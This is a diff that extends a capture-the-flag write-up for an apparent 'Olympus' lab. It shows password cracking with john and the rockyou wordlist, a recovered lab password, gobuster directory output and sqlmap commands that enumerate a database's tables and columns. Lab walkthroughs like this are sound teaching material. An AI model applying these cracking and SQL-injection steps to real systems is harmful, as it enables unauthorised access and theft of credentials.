@@ -244,10 +244,50 @@ But first, I need to decrypt the passwords for each user
 ````
 Then using `john` to decrypt those
 ```
-john --wordlist=--wordlist=/usr/share/wordlists/rockyou.txt <user>
+john --wordlist=/usr/share/wordlists/rockyou.txt <user>
 john --show <user>
 ```
+the password for user `prometheus` is summertime. For the other users, I got nothing.
+<img width="232" height="156" alt="Screenshot_2025-09-16_18-21-47" src="https://github.com/user-attachments/assets/7f2389a0-2347-42de-b974-cf4cee2f6fc6" />
+Using this login form to login to CMS Admin page
+<img width="1920" height="932" alt="Screenshot_2025-09-16_18-22-49" src="https://github.com/user-attachments/assets/41af66e1-1a93-41f5-9f0a-2ed65a6f4b2c" />
 
+This one potentially tries to tell me that there would be another domain name for this target
+<img width="1694" height="309" alt="Screenshot_2025-09-16_18-25-18" src="https://github.com/user-attachments/assets/5807916e-ece7-4ef1-83a9-55fbcc27c55a" />
+So I just add it to `/etc/host`
+<img width="412" height="26" alt="Screenshot_2025-09-16_18-27-24" src="https://github.com/user-attachments/assets/e0a9f28f-6cbd-4a7d-9638-871e2f3c0ee7" />
 
+Accessing to this domain leads me to this login page
+<img width="1920" height="617" alt="Screenshot_2025-09-16_18-28-20" src="https://github.com/user-attachments/assets/afa5114f-1502-460e-b133-0d586b49fba5" />
+Using prometheus credentials to get in
+<img width="1162" height="810" alt="Screenshot_2025-09-16_19-07-12" src="https://github.com/user-attachments/assets/a197a34e-8d7c-4a88-8443-317c9e090b1f" />
+
+I reckon that it would be relate to each other but first base on those text I have to use `gobuster` to check whether this domain has hidden directories or not
+```
+/.htpasswd            (Status: 403) [Size: 281]
+/.htaccess            (Status: 403) [Size: 281]
+/javascript           (Status: 301) [Size: 325] [--> http://chat.olympus.thm/javascript/]
+/phpmyadmin           (Status: 403) [Size: 281]
+/server-status        (Status: 403) [Size: 281]
+/static               (Status: 301) [Size: 321] [--> http://chat.olympus.thm/static/]
+/uploads              (Status: 301) [Size: 322] [--> http://chat.olympus.thm/uploads/]
+
+```
+
+I found the directory contained all the uploaded files, however I cannot access to the folder
+Remember the table that I found earlier using sqlmap
+```
++------------+
+| categories |
+| chats      |
+| chmments   |
+| flag       |
+| fosts      |
+| users      |
++------------+
+```
+Let's dig more into the chat table
+```
+sqlmap -r request.txt -D olymnpus -T chats --columns
 # Reference
 [SQLmap](https://www.vaadata.com/blog/sqlmap-the-tool-for-detecting-and-exploiting-sql-injections/#listing-the-table-names)
